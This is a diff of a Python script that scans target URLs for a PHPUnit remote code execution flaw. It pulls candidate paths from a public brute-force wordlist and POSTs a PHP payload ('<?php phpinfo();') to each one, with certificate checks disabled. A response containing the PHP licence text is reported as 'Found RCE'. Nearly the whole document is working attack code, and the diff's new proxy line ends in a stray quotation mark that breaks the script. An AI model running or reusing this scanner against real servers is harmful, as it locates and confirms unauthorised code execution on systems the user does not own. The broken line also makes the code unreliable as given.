@@ -28,30 +28,21 @@ urls = args.file
 
 
 if args.proxy:
-	proxy = args.proxy
-else:
-	proxy = ""
+	http_proxy = args.proxy
+	os.environ['HTTP_PROXY'] = http_proxy
+	os.environ['HTTPS_PROXY'] = http_proxy"
 	
 	
 
-
-http_proxy = proxy
-proxyDict = { 
-              "http"  : http_proxy, 
-              "https" : http_proxy, 
-              "ftp"   : http_proxy
-            }
             
-            
-
-
+           
 
 def test_url(url,urlpath):
 	newurl = ""+url+""+urlpath+""
 	rawBody = "<?php phpinfo();"
 	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded"}
 	try:
-		response = session.post(newurl, headers=headers,verify=False,data=rawBody, proxies=proxyDict,timeout=30)
+		response = session.post(newurl, headers=headers,verify=False,data=rawBody,timeout=30)
 		if response.status_code == 200:
 			if "PHP License as published by the PHP Group" in response.text:
 				print("[+] Found RCE for "+newurl+" [+]")
@@ -72,7 +63,7 @@ def test_url(url,urlpath):
 def grab_paths(url):
 	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
 	try:
-		response = session.get("https://raw.githubusercontent.com/random-robbie/bruteforce-lists/master/phpunit.txt", headers=headers,verify=False, proxies=proxyDict)
+		response = session.get("https://raw.githubusercontent.com/random-robbie/bruteforce-lists/master/phpunit.txt", headers=headers,verify=False)
 		lines = response.text.strip().split('\n')
 		for urlpath in lines:
 			loop = test_url(url,urlpath)
